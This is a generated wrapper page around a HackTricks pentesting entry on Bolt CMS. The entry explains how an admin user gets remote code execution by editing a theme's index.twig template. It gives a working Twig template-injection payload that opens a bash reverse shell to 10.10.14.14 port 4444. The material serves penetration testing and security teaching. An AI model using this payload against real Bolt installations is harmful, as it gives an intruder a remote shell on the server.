---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Bolt CMS

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-network-services-pentesting-pentesting-web-bolt-cms` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/bolt-cms.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Bolt CMS](../../topics/network-services-pentesting/bolt-cms.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-network-services-pentesting-pentesting-web-bolt-cms |
| name | Bolt CMS |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/network-services-pentesting/pentesting-web/bolt-cms.md |

## Preserved Source Material

```yaml
_body: "# Bolt CMS\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## RCE\n\nAfter login as admin (go to /bot lo access\
  \ the login prompt), you can get RCE in Bolt CMS:\n\n- Select `Configuration` -> `View Configuration` -> `Main Configuration`\
  \ or go the the URL path `/bolt/file-edit/config?file=/bolt/config.yaml`\n  - Check the value of theme\n\n<figure><img src=\"\
  ../../images/image (771).png\" alt=\"\"><figcaption></figcaption></figure>\n\n- Select `File management` -> `View & edit\
  \ templates`\n  - Select the theme base found in the previous (`base-2021` in this case) step and select `index.twig`\n\
  \  - In my case this is in the URL path /bolt/file-edit/themes?file=/base-2021/index.twig\n- Set your payload in this file\
  \ via [template injection (Twig)](../../pentesting-web/ssti-server-side-template-injection/index.html#twig-php), like: `{{['bash\
  \ -c \"bash -i >& /dev/tcp/10.10.14.14/4444 0>&1\"']|filter('system')}}`\n  - And save changes\n\n<figure><img src=\"../../images/image\
  \ (948).png\" alt=\"\"><figcaption></figcaption></figure>\n\n- Clear the cache in `Maintenance` -> `Clear the cache`\n-\
  \ Access again the page as a regular user, and the payload should be executed\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: network-services-pentesting/pentesting-web/bolt-cms.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/network-services-pentesting/pentesting-web/bolt-cms.md
```
